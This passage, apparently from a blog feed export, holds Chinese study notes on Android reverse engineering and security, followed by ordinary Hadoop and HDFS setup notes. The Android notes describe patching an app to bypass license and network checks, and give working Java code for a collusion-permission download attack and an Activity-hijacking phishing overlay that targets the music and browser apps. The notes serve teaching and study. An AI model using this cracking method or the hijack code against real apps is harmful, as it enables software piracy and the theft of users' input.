·对象类型：Ljava/lang/String；=java.lang.String ·数组：[I=int[].[[I=int[][] 方法： ·格式：Lpackage/name/ObjectName（类名）;-&gt;MethodName(III)Z (III:3个int参数，返回boolean参数) ·例子： method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/String 等价于 String method(int,int[][],int,String,Object[]) 字段： 格式：Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String 程序编译与反编译 class-&gt;dx-&gt;（dex文件；apk包，资源文件，androidManifest.xml）-&gt;baksmali-&gt;smali文件 dex就可以运行了 baksmali反编译工具 apk类似打包程序-&gt;解压 androidManifest.xml 配置文件 主要的反编译器： ·BakSmali（主要用这个） ·Dedexer Dalvik指令集 空操作指令：nop 数据操作指令：move move vA,vB 将vB寄存器的值赋给vA寄存器，源寄存器与目的寄存器都为4位 move-&gt;object/from 16 vAA,vBBBB 为对象赋值。源寄存器为8位，目的寄存器为16位 HelloWorld.smali .class public LHelloWorld; .super Ljava/lang/Object; .method public static main([Ljava/lang/String;)V (V:void) .registers 4 (表示4个寄存器) .parameter (参数是空) .prologue (函数实际执行内容) #空指令 nop nop nop nop #数据定义指令 const/16 v0,0x8 (把8放到v0里面) const/4 v1,0x5 const/4 v2,0x3 #数据操作指令 move v1, v2 （将v2值放到v1里面） #数组操作指令 new-array v0, v0, [I （创建一个数组，大小是第二个v0，类型是int数组，放入第一个v0里） array-length v1, v0 （将v0的长度放入v1） #实例操作指令 new-instance v1, Ljava/lang/StringBuilder; #方法调用指令 invoke-direct {v1},Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V #跳转指令 if-nez v0, :cond_0 (nez:not equals zero;如果不为0，则跳到cond_0) goto : goto_0 (如果为0，则跳到goto_0) :cond_0 #数据转换指令 int-to-float v2, v2 #数据运算指令 add-float v2, v2, v2 #比较指令 cmpl-float v0, v2, v2 (v2和v2比较的结果如果想等则返回0) #字段操作指令 sget-object v0, Ljava/lang/System:-&gt;out:Ljava/io/PrintStream; (获取System里面的out变量放入v0) const-string v1, &quot;hello world&quot; #构造字符串 （定义一个字符串放入v1） #方法调用指令 invoke-virtual {v0,v1},Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V #返回指令 :goto_0 return-void .end method 工具 ApkIDE（apk改之理） ApkToolkit jd-gui.exe Dalvik版的Hello World ·编译smali文件 java -jar smali.jar -o classes.dex HelloWorld.smali (-o:输出到classes.dex) ·执行程序 上传到手机：adb push classes.dex /data/local/ 执行程序：adb shell dalvikvm -cp /data/local/classes.dex HelloWorld ApkToolkit 将classes.dex-&gt;classes_dex.jar jd-gui.exe 查看jar文件 //note03 静态分析 ·定义： 不运行代码的情况下（相对的），阅读反汇编代码来掌握程序功能的一种技术 ·两种方法： 1.阅读Dalvik字节码（通过baksmali反编译dex文件生成smali文件） 2.阅读java代码（通过dex2jar生成jar文件，再jd-gui阅读jar文件） 定位关键代码 常用步骤 1.反编译apk (一般反编译成smali) 2.通过AndroidManifest.xml查找主Activity &lt;activity android:label=&quot;@string/title_activity_main&quot; android:name=&quot;.MainActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; #MAIN :主Activity &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt; #LAUNCHER :通过该Activity启动,即首先进入的activity &lt;/intent-filter&gt; &lt;/activity&gt; 3.查看程序的入口函数：主Activity的OnCreate() 4.查看Application类（全局，早于其他类启动）的OnCreate()函数。该函数通常用作授权检测 //.MainActivity 类名 title_activity_main 标题 定位关键代码： 常用方法： ·信息反馈法：运行时信息 ·特征函数法：运行时行为 ·顺序查看法：执行流程 ·代码注入法：添加Log reg smali文件格式： .class public Lcom/droider/crackme0502/MainActivity; .super Landroid/app/Activity .source &quot;mainActivity.java&quot; # instance fields .field private btnAnno:Landroid/widget/Button; .field private btnCheckSN:Landroid/widget/Button; .field private edtSN:Landroid/widget/EditText; # direct methods （直接方法） .method public constructor&lt;init&gt;()V (构造函数) .locals 0 （局部变量0个） .prologue .line 19 invokde-direct {p0},Landroid/app/Activity;-&gt;&lt;init&gt;()V （p0：当前这个对象this) return-void .end method 内部类的表示 ·MainActivity$1.smali:匿名内部类，多用于程序中的响应 ·MainActivity$SNChecker.smali:成员内部类 ·MainActivity.smali:外部类 ·this$0是内部类自动保留的一个指向所在外部类的引用。this表示父类的引用，右边的0便是引用的层数 ·例： public class Outer{ //this$0 public class FirstInner{ //this$1 pulblic class SecondInner{ //this$2 public class ThirdInner{} } } } ·this$X型字段都被指定了synthetic(合成)属性，表明他们是被编译器合成的，虚构的，非java代码指定的字段 内部类的表示： 构造函数执行步骤： 1.保存外部类的引用到本类的一个synthetic字段中 2.调用内部类的父类的构造函数 3.内部类自身初始化 reg：内部类，构造函数 .class public Lcom/droider/crackme0502/MainActivity$SNChecker;(成员内部类) .super Ljava/lang/Object .source &quot;mainActivity.java&quot; # instance fields .field private sn:Ljava/lang/String;（sn:一般指验证码） .field final synthetic this$0:Lcom/droider/crackme0502/MainActivity; #direct methods .method public constructor&lt;init&gt;(Lcom/droider/crackme0502/MainActivity;Ljava/lang/String;)V .locals 0 .param p2, &quot;sn&quot; # Ljava/lang/String; .prologue .line 83 #将外部类引用赋给p1 iput-object p1,p0, Lcom/droider/crackme0502/MainActivity$SNChecker;-&gt;this$0:Lcom/droider/crackme0502/MainActivity; #调用SNCheck的基类Object的构造函数 invoke-direct{p0},Ljava/lang/object;-&gt;&lt;init&gt;()V .line 84 #调用SNCheck自身的构造函数 iput-object p2,p0 Lcom/droider/crackme0502/MainActivity$SNChecker;-&gt;sn:Ljava/lang/String; .line 85 return-void .end method //note04 应用破解 ·试用版软件 ·网络验证 安卓模拟器： Eclipse自带有 BlueStatcks 将apk拖入BlueStatcks 将apk拖入ApkIDE crypt.smali (加密解密) R.smali（资源文件） MainActivity.smali onCreate(){} .locals 4 .param p1,&quot;xxx&quot; ... checkappKey()Z move-result v2 (将结果保存到v2里面) if-nez v2, :cond_2 ... :cond_2 const v2, 0x7f03001 (是一个资源编号) (右边有搜索,将编号放入可以搜一下) getAppKey() decryptAppkey() (解密函数) 这里会有一个跳转 if-ne v0,v2 :cond_3 (如果密钥匹配，就跳到cond_3) 在未授权的时候直接强行将其置成专业版的key值 保存-&gt;编译-&gt;生成xxx.apk 网络验证例子： 使用前会先去网络验证是否是正版，如果不通过可能不会让使用 想断网的时候验证能不能通过： 360-&gt;演示-&gt;手机操作 apkIDE-&gt;apk拖入 onClick(): getData() new-instance: v1, Ljava/lang/Thread; 可以直接删掉cond_0 ,return-void 编译-&gt;保存 //note05 系统攻击 ·手机ROOT及其危害 ·串谋权限攻击 ·组件安全 什么是ROOT？ 在手机使用过程中获取操作系统root权限，即最高管理员权限 手机root及其危害 root的危害 ·系统不稳定 ·病毒入侵 ·隐私数据暴露 权限攻击 串谋权限攻击 （联网下载文件并保存到SD卡上） 程序1的组件2不允许 程序2的组件1允许 程序1的组件2在没有权限的情况下，通过程序2的组件1联网并保存数据到SD卡 reg： Download.apk (有权限) EvilDownload.apk(没有权限) 在Download.apk最小化的时候，点开EvilDownload就实现了串谋攻击，就可以下载东西了 &lt;uses-permission android:name=&quot;android.permission.WRITE_EXERNAL_STORAGE&quot; /&gt; (写入外置SD卡权限) &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; （访问网络的权限） 没有这两个的话是没有相应权限的 MainActivity(): public void onCreate(Bundle savedInstanceState){ super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); setTitle(&quot;串谋攻击演示程序&quot;); btn1 = (Button)findViewById(R.id.button1); btn1.setOnClickListener(new OnClickListener(){ public void onClick(View v){ Intent intent = new Intent(); //创建Intent对象 intent.setAction(&quot;com.droider.download&quot;); intent.putExtra(&quot;url&quot;,&quot;http://114.215.197.165/Struts2Login/ info.txt&quot;); //要下载的文件URL String fileName = &quot;info.txt&quot;; //保存的文件名 intent.putExtra(&quot;filename&quot;,filename); sendBroadcast(intent); //发送广播 } } }); public class DownloadManager extends BroadcastReceiver{ @Override public void onReceive(Context context,Intent intent){ if(intent.getAction().equals(&quot;com.droider.download&quot;)){ String url = intent.getExtras().getString(&quot;url&quot;); String fileName = intent.getExtras().getString(&quot;filename&quot;); Toast.makeText(context,url,Toast.LENGTH_SHORT).show(); MyAsyncTask task = new MyAsyncTask(); task.execute(url,fileName); } } } Activity劫持 步骤： 1.遍历运行中的程序 2.恶意程序启动带FLAG_ACTIVITY_NEW_TASK标志的钓鱼式Activity覆盖正常的Activity 3.用户在伪造的界面上进行操作 4.恶意程序将信息发送到指定的网址 5.切换到原来的Activity public class Hijacker extends Service{ private boolean started = false; private List&lt;String&gt; mhijackingList; //劫持的进程列表 private Timer mTimer = new Timer(); private TimerTask mTask = new TimerTask(){ @Override public void run(){ Log.d(&quot;com.droider.hijacker&quot;,&quot;timertask start...&quot;); ActivityManager am = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE; started = true; List&lt;RunningAppProcessInfo&gt; infos = am.getRunningAppProcesses();//枚举正在运行的进程列表 for(RunningAppProcessInfo psinfo: infos){ if(psinfo.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND)//前台进程 if(mhijackingList.contains(psinfo.processName)){ Log.d(&quot;com.droider.hijacker&quot;,&quot;hijacking start...&quot;); Intent intent = new Intent(getBaseContext(),HijackActivity.class); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); intent.putExtra(&quot;processname&quot;,psinfo.processName); getApplication().startActivity(intent);//启动伪造的Activity } } } } @Override public int onStartCommand(Intent intent,int flags,int startId){ Log.d(&quot;com.droider.jijacker&quot;,&quot;service start..&quot;); mhijackingList = ((MyApp)getApplication()).hijackingList; if(!started) mTimer.scheduleAtFixedRate(mTask,2000,1500);//定时检查启动的进程列表中是否有被劫持的程序 return super.onStartCommand(intent,flags,startId); } } public class MyApp extends Application{ List&lt;String&gt; hijackingList; @Override public void onCreate(){ hijackingList = new ArrayList&lt;String&gt;(); hijackingList.add(&quot;com.android.music&quot;); hijackingList.add(&quot;com.android.browser&quot;);//要劫持的进程 super.onCreate(); } } public class HijackActivity extends Activity{ private TextView tv; @Override public void onCreate(Bundle savedInstanceState){ super.onCreate(savedInstanceState); setContentView(R.layout.activity_hijack); setTitle(&quot;Activity劫持页面&quot;)； tv=(TextView)findViewById(R.id.tv_process); tv.setTextColor(Color.RED); tv.setText(&quot;被劫持的进程：&quot;); Bundle bundle = getIntent().getExtras(); if(bundle != null){ if(bundle.containsKey(&quot;processname&quot;)){ String str = bundle.getString(&quot;processname&quot;); tv.setText(&quot;被劫持的进程：&quot;+str); } } } @Override public boolean onTouchEvent(MotionEvent event){ Intent intent = new Intent(HijackActivity.this,Hijacker.class); stopService(intent); //停止劫持服务 moveTaskToBack(true); return super.onTouchEvent(event); } } //可以让程序不在最近访问的程序列表里面 特点：不需要声明任何权限，一般杀毒软件无法检测]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>逆向</category>
        <category>Android</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>Android</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大数据学习笔记01-hadoop]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-hadoop%2F</url>
    <content type="text"><![CDATA[Hadoop--炼数成金 //note01 Hadoop介绍与安装 。。。 倒排索引 （1；1） 单词出现在标识号为1的网页的编辑量是第1的位置 分词难度： 字典； Page Rank 用于给每个网页价值评分 Map-reduce思想： 计算PR Lucene hadoop的起源，提供了全文检索引擎的架构 nutch HBase 列式存储（面向数据分析）（提高响应速度及I/O） Namenode HDFS的守护程序 记录文件是如何分割成数据块的，以及这些数据块被存储到哪些节点上 对内存和I/O进行集中管理 是个单点，发生故障将使集群崩溃 Secondary Namenode 监控HDFS状态的辅助后台程序 每个集群都有一个 与NameNode进行通讯，定期保存HDFS元数据快照 当NameNode故障可以作为备用NameNode使用 DataNode 每台从朋务器都运行一个 负责把HDFS数据块读写到本地文件系统 JobTracker 用于处理作业(用户提交代码)的后台程序 决定有哪些文件参不处理，然后切割task幵分配节点 监控task，重启失败的task(于不同的节点) 每个集群只有唯一一个JobTracker，位于Master节点 TaskTracker 位于slave节点上，与datanode结合(代码与数据一起的原则) 管理各自节点上的task(由jobtracker分配) 每个节点只有一个tasktracker，但一个tasktracker可以启动多个JVM， 用于并行执行map或reduce仸务 与jobtracker交互 Master与Slave Master:Namenode、Secondary Namenode、Jobtracker。浏览器(用于观看管理界面)，其它Hadoop工具 Slave:Tasktracker、Datanode Master不是唯一的 安装： ssh-keygen -t rsa scp ./id_rsa.pub huang@192.168.04:/home/huang/.ssh (名称节点的服务器) hadoop/conf/hadoop-env.sh //只改JAVA_HOME就行 hadoop/conf/core-site.xml &lt;configuration&gt; &lt;property&gt; &lt;name&gt;fs.default.name&lt;/name&gt; &lt;value&gt;hdfs://backup01:9000&lt;/value&gt; //指定名称节点位置 &lt;/property&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; //临时路径，不指定会默认用root下的./tmp目录，一定要设置这个参数 &lt;value&gt;/home/huang/hadoop/tmp&lt;/value&gt; &lt;/property&gt; &lt;/configuration&gt; hadoop/conf/hdfs-site.xml &lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; //服务器因子 &lt;value&gt;1&lt;/value&gt; //2代表复制2份,1不复制 &lt;/property&gt; &lt;/configuration&gt; hadoop/conf/mapred-site.xml &lt;property&gt; &lt;name&gt;mapred.job.tracker&lt;/name&gt; &lt;value&gt;backup01:9001&lt;/value&gt; &lt;/property&gt; hadoop/conf/masters.xml //填master主机名称 hadoop/conf/slaves.xml //填slaves主机名称 vi /etc/hosts //检查防火墙 chkconfig iptables off (集群里面的配置几乎都一样) scp -r ./hadoop-1.1.2 huang@192.168.0.4:/home/huang/ 格式化名称节点： bin/hadoop namenode -format bin/start-all.sh //处理自己连自己免密码问题 .ssh id_rsa.pub -&gt; copy -&gt; authorized_keys 在末尾粘贴 bin/start-all.sh //启动所有的节点 //检查系统是否正常启动 /usr/jdk1.7.0_25/bin/jps //jps：java相关进程统计 伪分布式： 到本地自己给自己免密码： 只需要将.ssh/id_rsa.pub 复制成 authorized_keys CentOS,安装与编译有关的包： yum install svn //可以部署到其他服务器 yum install autoconfautomake libtool cmake yum install ncurses-devel yum install openssl-devel yum install gcc* 安装maven //优点：参数可以结构化写在一个xml里面 需要安装protobuf这个插件 /usr/local/bin/protoc svn mvn //之后有一个本地库问题 //测试hello world //建立一个子目录 mkdir input cd input/ echo &quot;hello world&quot; &gt; test1.txt echo &quot;hello hadoop&quot; &gt; test2.txt bin/hadoop fs -ls bin/hadoop fs -put ../input ./in //复制input到/.in bin/hadoop fs -ls bin/hadoop fs -ls ./in/* //hadoop是没有当前路径一说的 bin/hadoop fs -cat ./in/test1.txt jar包统计： bin/hadoop jar hadoop-examples-1.1.2.jar wordcount in out //out 输出文件名称 in 源文件名称 bin/hadoop fs -ls ./out /out/part-r-00000 //放的是结果 port:50070 port:50030 219.232.252.17:50070 CDH安装 //note02 HDFS 提供分布式存储机制，提供可线性增长的海量存储能力 自动数据冗余，无须使用Raid，无须另行备份 为进一步分析计算提供数据基础 MR在HDFS基础上进行快速分析 PC组成集群即可。在任何节点，只要发布操作命令，就可以对整个HDFS系统进行统一操作 //本地化数据计算，节省传输花费的时间，也是HDFS设计的原则所在 包含： NameNode DataNode 事务日志 映像文件 SecondaryNameNode cat tmp/dfs/name/current/VERSION namespaceID= //记录命名空间的标识号，就是整个集群的标识 cTime=0 //这个HDFS创建的时间 storageType=NAME_NODE //存储的类型 layoutVersion=-32 //-32 构造版本 还有影像文件，编辑日志 //每隔一段时间会有一个检查点将内存的数据写到fs里面实地保存 //edits会记录用户的各个操作，当系统如果有异常崩溃的话，系统恢复时它会先加载fsimage，调用edits重做一遍；如果写过一次fsimage，在这之前的操作就没用了； cat dfs/namesecondary/current/VERSION //备份 //blk开头的文件是数据块 一个文件的写是写到不同的datanode里面的 冗余副本策略 //在复制冗余副本的时候用户是不能操作的 机架策略 //机架一般放20多个服务器，每个机架之间用交换机相连，交换机通过一个上级交换机来连接；同一机架下的节点只经过一个交换机，所以传输速度快 core-site.xml //设置机架 心跳机制 //每隔一段时间给Namenode发送一次 安全模式 //安全模式下用户不能写数据，节点多的话可能会长达10多分钟 bin/hadoop dfsadmin -safemode enter //强制进入安全模式 校验和 blk_xxxx.meta //crc校验然后写到.meta文件里,缺省值512字节产生4个字节校验和 //校验和本身很消耗性能,使用的是jvm的软件进行软计算算的。可以直接改成cpu硬计算 //性能优化一般都会到jvm里面去操作 回收站 //如果打开的话需要先配置core-site.xml //测试 bin/hadoop fs -rmr ./in/test1.txt //会出现./Trash这个文件，相当于移到了回收站的目录 恢复和清空 mv 将.Trash的文件移回来就OK了 fs -expunge //清空 元数据保护 //配置多个副本会影响namenode处理速度，但是会增加安全性。 快照 HDFS文件操作 hadoop没有当前目录的概念，也没有cd命令，需要绝对地址 //查看HDFS下某个文件的内容 bin/hadoop fs -cat ./in/test1.txt //查看HDFS基本统计信息 bin/hadoop dfsadmin -report //HDFS是不能修改，下载到linux文件改完再传回去 怎么添加节点？ 在新节点安装好hadoop 把namenode的有关配置文件复制到该节点 修改masters和slaves文件，增加该节点 设置ssh免密码迕出该节点 单独启劢该节点上的datanode和tasktracker(hadoop-daemon.sh start datanode/tasktracker) 运行start-balancer.sh迕行数据负载均衡 //start-dfs.sh,不需要重启集群 java操作HDFS： URLCat.java public class URLCat{ static{ URL.setURLStreamHandlerFactory(new FsUrlStreamHandlerFactory()); } public static void main(String[] args) throws Exception{ inputStream in = null; try{ in = new URL(args[0]).openStream(); IOUtils.copyBytes(in,System.out,4096,false); }finally{ IOUtils.closeStream(in); } } } 设置Hadoop类目录 Hadoop-env.sh export HADOOP_CLASSPATH=xxxxx/myclass 设置搜索目录 ls -a //查看隐藏文件 .bash_profile //脚本 javac URLCat.java //会报错,因为没有import Hadoop的包 cd hadoop/lib //导入包之后还会报错，再指定classpath的jar路径就OK了 javac -classpath ../hadoop-core-1.1.2.jar URLCat.java bin/hadoop URLCat hdfs://backup01/usr/huang/in/test1.txt //运行jar //这里没有指定端口 bin/hadoop URLCat hdfs://backup01:9000/usr/huang/in/test1.txt 下载ant 下载参考书的代码并上传解开 7287OS_Code/ cd chapter2 cd HDFS_JAVA_API/ cd src 设置HADOOP_HOME环境变量 build.xml loaction=&quot;build&quot; //输出到build文件夹里 /home/huang/apache-ant-1.9.2/bin/ant //在HDFS_Java_API目录下执行 ~/hadoop-1.1.2/bin/hadoop jar HDFSJavaAPI.jar HDFSJavaAPIDemo C_API 安装gcc (c语言的编译器) yum -y install gcc gcc-c++ autoconf make 测试HDFS C_API hdfs_cpp_demo.c #inlude &quot;hdfs.h&quot; int main(int argc,char **argv){ hdfsFS fs = hdfsConnect(&quot;backup01&quot;,9000); if(!sf){ fprintrf(stderr,&quot;Cannot connect to HDFS.\n&quot;); exit(-1); } char* fileName = &quot;demo_txt&quot;; char* message=&quot;Welcome to HDFS C API!&quot;; int size = strlen(message); } //bin/tar.zz.mds 没有源码的包 个人配置的话 编译 gcc hdfs_app_demo.c \ -I $HADOOP_HOME/src/c++/libhdfs \ //-I 包含 -I $JAVA_HOME/include \ -I $JAVA_HOME/include/linux/ \ -L $HADOOP_HOME/c++/Linux-amd64-64/lib/ -lhdfs \ //-L 连接库的路径 -L $JAVA_HOME/jre/lib/amd64/server -ljvm \ -o hdfs_cpp_demo // -o 输出 利用之前ant输出设置CLASSPATH环境变量 要把Hadoop所有的jar包都列进去 利用ant打印环境变量 /home/xxx/ant print -cp export CLASSPATH=xxxxx //要在同一命令行下执行 LD_LIBRARY_PATH=$HADOOP_HOME/xxx/amd64/server ./hdfs_cpp_demo java解读： FileSystem public class FileSystemCat{ main() throws Exception{ String uri = args[0]; Configuration conf = new Configuration(); FIleSystem fs = FileSystem.get(URI.create(uri),conf); InputStream in = null; try{ in = fs.open(new Path(uri)); IOUtils.copyBytes(in,System.out,4096,false); //hadoop包的 }finally{ IOUtils.closeStream(in); } } } hadoop FileSystemCat hdfs://localhost/user/tom/quangle.txt //C程序可以查看hdfs.h这个文件了解API Hadoop 2.x (namenode不再是单点) HDFS HA 管理命令手册 块池 同一个datanode可以存着属于多个block pool的多个块 //hadoop_v4_02g hdfs-site.xml dfs.nameservices &lt;value&gt;ns1,ns2&lt;/value&gt; ... 格式化名称节点 HDFS快照 快照位置 hdfs dfs -ls /foo/.snapshot //note03 HDFS HA联邦安装 DNS安装 yum -y install bind bind-utils bind-chroot rpm -qa | grep &apos;^bind&apos; //查看是否安装成功 vim /etc/named.conf options{ listen-on port 53 { 127.0.0.1;}-&gt; { any; } allow-query {localhost;} -&gt; { any; } //对所有用户开放 } vim /etc/named.rfc1912.zones //末尾添加 zone &quot;hadoop.com&quot; IN { //正解区域 type master; file &quot;named.hadoop.com&quot;; allow-update { none; }; } zone &quot;0.168.192.in-addr.arpa&quot; IN { //反解区域 type master; file &quot;named.192.168.0.zone&quot;; allow-update { none; }; } cp -p named.localhost named.hadoop.com //复制的时候保持文件权限不变 vim named.hadoop.com IN SOA user3.hadoop.com. grid.user3.hadoop.com. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum IN NS user3.hadoop.com. user3.hadoop.com. IN A 192.168.0.109 user3.hadoop.com. IN A 192.168.0.110 user3.hadoop.com. IN A 192.168.0.111 user3.hadoop.com. IN A 192.168.0.112 user3.hadoop.com. IN A 192.168.0.113 user3.hadoop.com. IN A 192.168.0.114 [named] cp -p named.localhost named.192.168.0.zone vim named.192.168.0.zone IN SOA user3.hadoop.com. grid.user3.hadoop.com. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum IN NS user3.hadoop.com. 109 IN PTR user3.hadoop.com. 110 IN PTR user3.hadoop.com. 111 IN PTR user3.hadoop.com. 112 IN PTR user3.hadoop.com. 113 IN PTR user3.hadoop.com. 114 IN PTR user3.hadoop.com. //slave vim /etc/sysconfig/network-scripts/ifcfg-eth0 //末尾添加DNS服务器IP地址 DNS1=192.168.0.109 //在每台slave添加 service network restart service named start //启动DNS chkconfig named on //开机就将DNS服务启动 //检查 chkconfig --list named chkconfig --level 123456 named off tail -n /var/log/messages | grep named //测试主机名解析 nslookup user3.hadoop.com HDFS HA + 联邦 + Resource Manager HA //安装好DNS之后 cat /etc/resolv.conf //查看 nslookup www.dataguru.cn //测试 NFS (网络文件系统) 可以设置配置文件把某些目录共享出去，并可以设置权限 scp -rp ./hadoop-0.20.2 grid@h1:/home/grid awk脚本 awk &apos;{print $1}&apos; //awk 都用单引号,以空格/制表符分隔 ，一般处理表格等文件，reg：日志文件 awk &apos;$9~/rr/{print $9}&apos; //~包含 {}里面放执行语句 //除了awk，还要学sed cat slave h1 h2 h3 h4 h5 h6 cat ./slave | awk &apos;{print &quot;scp -rp ./hadoop-0.20.2 grid@&quot;$1&quot;:/home/grid&quot;}&apos; &gt; scp_test chmod a+x scp_test //变成可执行文件 sh ./scp_test //note04 MR //超级计算机结构是非开放的，每一台都是定制的 //reg：日志分析，通过hdfs切割成很多的块，分散到各个节点上，然后各个节点一起来并行计算，再把结果加起来 //并行计算框架 MPI c语言的函数库 计算密集型，算是瓶颈 PVM CUDA 英伟达配合显卡GPU推出来的包，利用GPU多核心来处理 BOINC 互联网计算（可以当分析志愿者） Map-Reduce 负担主要在I/O 云计算 目前流行的开源云计算解决方案 reg：气象数据集： zcat xxx-xx-x.gz //查看.gz文件 解压及合并： zcat *.gz &gt; sample.txt //按数据量大小来解压合并 分析MR input -&gt; |有偏移量key| -&gt; map -&gt; |(key,value)| -&gt; shuffle -&gt; |聚合操作| -&gt; reduce -&gt; |求value的最大值/平均值等| -&gt; output -&gt; hdfs Java MapReduce 通常需要3段程序 1.映射器 (从原始数据读成key，value)MaxTemperatureMapper 2.reducer（key,value变成最后需要的形式） MaxTemperatureReducer 3.作业程序,总调度 MaxTemperature 运行MR cd myclass //讲课创建的jar测试目录 cat MaxTemperatureMapper.java cat MaxTemperature.java cat MaxTemperatureReducer.java javac -classpath ../hadoop-core-1.1.2.jar *.java ../bin/hadoop MaxTemperature ./user/huang/in/723440-13964 ./out6 //数据文件. 输出到out6 //没有找到Mapper，解决方式，打成jar包 jar cvf ./MaxTemperature.jar *.class mv MaxTemperature.jar .. //需要删掉之前的class文件 rm *.class cd .. bin/hadoop jar ./MaxTemperature.jar MaxTemperature ./user/huang/in/723440-13964 ./out6 ../bin/hadoop fs -ls ./out6 ../bin/hadoop fs -cat ./out6/part-r-00000 //分析计算过程 Mapper public void map(LongWritable key,Text value,Context context) throws IOException,InterruptedException{ String line = value.toString(); String year = line.substring(15,19); int airTemperature; if(line.charAt(87) == &apos;+&apos;){ //parseInt doesn&apos;t like leading plus signs airTemperature = Integer.parseInt(line.substring(88,92)); }else{ airTemperature = Integer.parseInt(line.substring(87,92)); } String quality = line.substring(92,93); if(airTemperature != MISSING &amp;&amp; quality.matches(&quot;[01459]&quot;)){ context.write(new Text(year),new IntWritable(airTemperature)); } } Reducer public class MaxTemperatureReducer extends Reducer&lt;Text,IntWritable,Text,IntWritable&gt;{ @Override public void reduce(Text key,Iterable&lt;IntWritable&gt; values,Context context) throws IOException,InterruptedException{ int maxValue = Integer.MIN_VALUE; for(IntWritable value:values){ maxValue = Math.max(maxValue,value.get(); } context.write(key,new IntWritable(maxValue)); } } M-R job public class MaxTemperature{ main() throws Exception{ if(args.length != 2){ System.err.println(&quot;Usage:MaxTemperature&lt;input path&gt; &lt;output path&gt;&quot;); System.exit(-1); } Job job = new Job(); job.setJarByClass(MaxTemperature.class); job.setJobName(&quot;Max temperature&quot;); FileInputFormat.addInputPath(job,new Path(args[0])); FileOutputFormat.setOutputPath(job,new Path(args[1])); job.setMapperClass(MaxTemperatureMapper.class); job.setReducerClass(MaxTemperatureReducer.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(IntWritable.class); System.exit(job.waitForCompletion(true)?0:1); } } 分片的问题 Combiner 做预计算的。 Map-Reduce工作机制 //java跟c相比，慢的是启动jvm这个过程。jvm启动不挂的话还是很快的 有一个心跳是3秒一次，jobtracker周期是1分钟一次 主要工作：SQL或PL/SQL改写为Map-Reduce程序 Eclipse: hadoop/contrib/eclipse-plugin/xxx.jar windows-&gt;preferences-&gt;hadoop map/reduce show Map-Reduce 显示MR视图 在视图右键-&gt;new Hadoop loaction-&gt; Location name:xxx hadoop/conf/mapred-site.xml -&gt;找端口 端口填写一致 左侧右键DFS Loactions-&gt;Disconnect-&gt;home user new -&gt; MapReduce Project -&gt; name:xxx src-&gt;new example.java @Override public int run(String[] args)throws Exception{ Configuration conf = getConf(); Job job = new Job(conf,&quot;example&quot;); //任务名 job.setJarByClass(example.class); //指定Class FileInputFormat.addInputPath(job,new Path(args[0])); //输入路径 FileOutputFormat.setOutputPath(job,new Path(args[1])); //输出路径 job.setMapperClass(Map.class); //调用上面Map类作为Map任务代码 job.setReducerClass(Reduce.class); //调用上面Reduce类作为Reduce任务代码 job.setOutputFormatClass(TextOutputFormat.class); //指定输出的KEY的格式 job.setOutputKeyClass(Text.class); //指定输出的KEY的格式 job.setOutputValueClass(Text.class); //指定输出的VALUE的格式 job.waitForCompletion(true); return job.isSuccessful()?0:1; } main(){ int res = ToolRunner.run(new Configuration(),new example(),args); System.exit(res); } 源文件: -&gt; Mapper 1.分割原始数据 2.输出所需数据 3.处理异常数据 -&gt; 输出到HDFS public class Test_1 extends Configured implements Tool{ enum Counter{ //可以对其自增操作 LINESKIP, //出错的行 } public static class Map extends Mapper&lt;LongWritable,Text,NullWritable,Text&gt;{//变量为: 输入,输出key,value格式 //Text主要记录字符串的,NullWritable 空值 //key 偏移量 ，内容 value public void map(LongWritable key,Text value,Context context) throws IOException,InterruptedException{ String line = value.toString(); //读取源数据 try{ //数据处理 String[] lineSplit = line.split(&quot; &quot;); String month = lineSplit[0]; String time = lineSplit[1]; String mac = lineSplit[6]; Text out = new Text(month + &apos;&apos; + time + &apos;&apos; + mac); //如果是context.write(key,out);则会出现\t //用了NullWritable.get() 之后不会出现 \t context.write(NullWritable.get(),out);//输出 key \t value }catch(java.lang.ArrayIndexOutOfBoundsExecption e){ context.getCounter(Counter.LINESKIP).increment(1);//出错令计数器+1 return; } } } @Override public int run(String[] args)throws Exception{ Configuration conf = getConf(); Job job = new Job(conf,&quot;example&quot;); //任务名 job.setJarByClass(Test_1.class); //指定Class FileInputFormat.addInputPath(job,new Path(args[0])); //输入路径 FileOutputFormat.setOutputPath(job,new Path(args[1])); //输出路径 job.setMapperClass(Map.class); //调用上面Map类作为Map任务代码 job.setReducerClass(Reduce.class); //调用上面Reduce类作为Reduce任务代码 job.setOutputFormatClass(TextOutputFormat.class); //指定输出的KEY的格式 job.setOutputKeyClass(Text.class); //指定输出的KEY的格式 job.setOutputValueClass(Text.class); //指定输出的VALUE的格式 job.waitForCompletion(true); return job.isSuccessful()?0:1; } main(){ //运行任务 int res = ToolRunner.run(new Configuration(),new Test_1(),args); System.exit(res); } } Run_Configurations-&gt;Test_1-&gt;Arguments: hdfs://localhost:9000/user/james/input hdfs://localhost:9000/user/james/output //output必须是不存在的 倒排索引 new-&gt;Haodoop Project-&gt;Test_2 public calss Test_2 extends Configured implements Tool{ enum Counter{ LINESKIP } public static class Map extends Mapper&lt;LongWritable,Text,Text,Text&gt;{//变量为: 